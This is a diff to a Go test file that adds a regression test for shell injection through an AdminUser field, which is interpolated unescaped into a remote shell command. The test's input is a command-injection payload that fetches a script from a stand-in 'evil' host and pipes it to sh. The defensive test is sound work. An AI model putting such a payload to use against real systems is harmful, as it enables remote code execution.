@@ -156,6 +156,29 @@ func TestResolveAdminCredentialIsStableAcrossReinstalls(t *testing.T) {
 	}
 }
 
+// TestResolveAdminCredentialRejectsUnsafeAdminUser guards against a real
+// injection: AdminUser ends up interpolated into a remote shell command
+// (resetRemoteAdminPassword) and a systemd EnvironmentFile line (renderEnv)
+// with no escaping. It's always "admin" through every real UI path — the
+// one way it can hold anything else is store.DB.ImportHosts inserting an
+// uploaded export file's fields with no validation of their own — so this
+// is the single choke point both of those production call sites go
+// through, and it must refuse to hand back a value that isn't a plain
+// identifier rather than silently passing it downstream.
+func TestResolveAdminCredentialRejectsUnsafeAdminUser(t *testing.T) {
+	m, _ := newTestManager(t)
+	ctx := context.Background()
+
+	host := store.Host{
+		ID:               1,
+		AdminUser:        "admin'; curl http://evil/x|sh #",
+		AdminPasswordEnc: nil,
+	}
+	if _, _, err := m.resolveAdminCredential(ctx, host.ID, host); err == nil {
+		t.Fatal("resolveAdminCredential accepted a shell-metacharacter AdminUser instead of rejecting it")
+	}
+}
+
 // TestCancelInstallWithNoLiveJobResetsStatus covers the "hub restarted
 // mid-install" case: nothing left in jobByHost to actually cancel, but the
 // host must not stay stuck on 'installing' forever with no working control
